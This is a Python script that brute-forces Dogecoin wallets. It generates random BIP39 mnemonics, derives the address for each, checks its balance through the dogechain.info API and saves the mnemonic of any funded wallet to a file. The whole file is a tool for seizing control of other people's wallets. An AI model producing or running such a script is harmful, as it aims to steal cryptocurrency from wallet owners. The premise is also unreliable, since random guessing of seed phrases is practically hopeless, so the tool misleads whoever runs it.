import os
import random
import requests
import binascii
from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins
import time

# Function to generate a random 12-word BIP39 mnemonic
def generate_mnemonic():
    return Bip39MnemonicGenerator().FromWordsNumber(12)

# Function to derive Dogecoin wallet address from mnemonic
def get_doge_wallet_from_mnemonic(mnemonic):
    seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.DOGECOIN)
    bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0).Change(False).AddressIndex(0)
    return bip44_acc_ctx.PublicKey().ToAddress(), seed_bytes.hex()

# Function to check Dogecoin wallet balance using a public API
def check_doge_balance(address):
    api_url = f"https://dogechain.info/api/v1/address/balance/{address}"
    try:
        response = requests.get(api_url)
        data = response.json()
        if "balance" in data:
            return float(data["balance"])
        return 0
    except Exception as e:
        print(f"Error checking balance: {e}")
        return 0

# Main brute-force loop
def brute_force_doge_wallets(attempts=1000000):
    found_wallets = []
    
    for i in range(attempts):
        mnemonic = generate_mnemonic()
        address, seed = get_doge_wallet_from_mnemonic(mnemonic)
        balance = check_doge_balance(address)
        
        print(f"Attempt {i+1}: Address {address} | Balance: {balance} DOGE")
        
        if balance > 0:
            found_wallets.append(f"Mnemonic: {mnemonic}\nAddress: {address}\nBalance: {balance} DOGE\n\n")
            with open("wallets_with_balance.txt", "a") as f:
                f.writelines(found_wallets)
    
        time.sleep(1)  # To avoid spamming the API

if __name__ == "__main__":
    brute_force_doge_wallets()
